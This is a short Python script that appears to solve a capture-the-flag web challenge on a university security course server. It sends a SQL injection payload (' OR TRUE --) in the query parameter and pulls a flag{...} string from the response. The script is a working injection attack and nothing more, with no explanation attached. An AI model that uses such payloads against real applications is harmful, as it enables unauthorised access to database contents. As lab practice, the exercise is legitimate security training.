import re
import requests

URL = "https://t04-fc7953db9d8ef268.itsec.sec.in.tum.de/?q="
QUERY = "%27+OR+TRUE+--"

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

with requests.Session() as sess:
    final_query = URL + QUERY
    response = sess.get(final_query)
    print(extract_flag_from_string(response.text))
